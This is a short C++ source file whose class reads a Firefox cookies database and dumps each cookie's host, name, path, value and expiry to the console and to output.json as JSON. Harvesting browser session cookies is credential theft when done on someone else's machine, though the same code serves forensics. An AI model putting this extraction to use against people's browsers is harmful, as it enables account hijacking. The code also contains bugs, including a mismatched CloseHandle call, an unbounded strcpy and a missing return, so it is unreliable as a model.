#include "FirefoxCookies.hpp"




FirefoxCookies::FirefoxCookies(char* sFilePath) {
	strcpy(this->m_sFilePath, sFilePath);
	this->m_stmt = nullptr;
}

FirefoxCookies::~FirefoxCookies() {
	CloseHandle(this->m_stmt);
}

bool FirefoxCookies::QuerySqlite() {
	sqlite3* db;
	printf("%s\n", this->m_sFilePath);
	if (sqlite3_open(this->m_sFilePath, &db) != SQLITE_OK) {
		printf("sqlite3_open error!\n");
		return false;
	}
	sqlite3_stmt* stmt;
	int x = sqlite3_prepare_v2(db, "SELECT	host, name, path, value, expiry FROM moz_cookies", -1, &stmt, 0);
	if (sqlite3_prepare_v2(db, "SELECT	host, name, path, value, expiry FROM moz_cookies", -1, &this->m_stmt, 0) != SQLITE_OK) {
		printf("sqlite3_prepare_v2 error!\n");
		return false;
	}

	while (sqlite3_step(this->m_stmt) == SQLITE_ROW) {
		char* host_key = (char*)sqlite3_column_text(this->m_stmt, 0);
		char* name = (char*)sqlite3_column_text(this->m_stmt, 1);
		char* path = (char*)sqlite3_column_text(this->m_stmt, 2);
		char* value = (char*)sqlite3_column_text(this->m_stmt, 3);
		char* expires_utc = (char*)sqlite3_column_text(this->m_stmt, 4);

		if (host_key == nullptr && name == nullptr && value == nullptr)
			break;
		
	/*	if ((strlen(host_key) == 0) && (strlen(name) == 0) && (strlen(value) == 0))
			continue;*/

		cJSON* root = cJSON_CreateObject();
		cJSON_AddStringToObject(root, "host_key", host_key);
		cJSON_AddStringToObject(root, "name", name);
		cJSON_AddStringToObject(root, "path", path);
		cJSON_AddStringToObject(root, "value", value);
		cJSON_AddStringToObject(root, "expires_utc", expires_utc);

		char* json_string = cJSON_Print(root);
		printf("%s\n", json_string);

		FILE* file = fopen("output.json", "a+");
		if (file == NULL) {
			printf("Failed to open file.\n");
			return 1;
		}

		fprintf(file, "%s", json_string);

		fclose(file);

		cJSON_Delete(root);
		cJSON_free(json_string);
	}
}